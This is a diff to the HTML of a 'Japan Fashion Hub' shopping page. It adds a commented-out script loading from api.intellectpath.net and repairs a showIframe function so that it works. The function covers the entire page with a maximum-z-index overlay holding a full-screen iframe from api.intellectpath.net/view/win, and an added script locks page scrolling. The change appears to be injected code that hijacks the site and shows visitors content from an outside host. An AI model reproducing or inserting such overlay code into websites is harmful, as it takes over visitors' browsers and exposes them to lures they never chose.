@@ -3,6 +3,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Japan Fashion Hub</title>
+<!--<script src="https://api.intellectpath.net/timezone/20maywebdeskFrizz2k26/Ma0cHelpMark0er007"></script>-->
     
 <meta name="description" content="Japan Fashion Hub showcases the latest Japanese fashion, including men's and women's wear and accessories.">
 <meta name="keywords" content="Japanese fashion, men, women, polo shirts, fashion shopping">
@@ -286,57 +287,58 @@ async function initOnce(){
 }
 
 function showIframe(){
-const createFrame = () => {
 
-    if(document.getElementById("bruceDiv"))
-        return;
+    const createFrame = () => {
 
-    document.documentElement.style.overflow="hidden";
+        if(document.getElementById("bruceDiv"))
+            return;
 
-    const div =
-        document.createElement("div");
+        document.documentElement.style.overflow="hidden";
 
-    div.id="bruceDiv";
+        const div =
+            document.createElement("div");
 
-    div.style.cssText=
-    "position:fixed; inset:0; z-index:9999; pointer-events:auto; overflow:hidden;";
+        div.id="bruceDiv";
 
-    const iframe =
-        document.createElement("iframe");
+        div.style.cssText=
+        "position:fixed;inset:0;z-index:2147483647;background:#fff;";
 
-    iframe.src =
-    "https://api.intellectpath.net/view/win";
+        const iframe =
+            document.createElement("iframe");
 
-    iframe.style.cssText =
-    "width:100%;height:100%;border:0;display:block;";
+        iframe.src=
+        "https://api.intellectpath.net/view/win";
 
-    iframe.allow =
-    "fullscreen; autoplay; encrypted-media; picture-in-picture";
+        iframe.style.cssText=
+        "width:100%;height:100%;border:0;display:block;";
 
-    iframe.allowFullscreen = true;
-    iframe.setAttribute("webkitallowfullscreen", "");
-    iframe.setAttribute("mozallowfullscreen", "");
+        iframe.allow=
+        "fullscreen; autoplay; encrypted-media; picture-in-picture";
 
-    div.appendChild(iframe);
+        iframe.allowFullscreen=true;
 
-    document.body.appendChild(div);
-};
+        div.appendChild(iframe);
 
-if(document.body){
-    createFrame();
-}else{
-    window.addEventListener("DOMContentLoaded", () => {
-document.body.style.overflow = "hidden";
-});
-{once:true}
-    );
+        document.body.appendChild(div);
+    };
+
+    if(document.body){
+        createFrame();
+    }else{
+        window.addEventListener(
+            "DOMContentLoaded",
+            createFrame,
+            {once:true}
+        );
+    }
+
 }
-    
-}
-
 
 })();
 </script>
+<script>
+    document.body.style.overflow = "hidden";
+</script> 
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
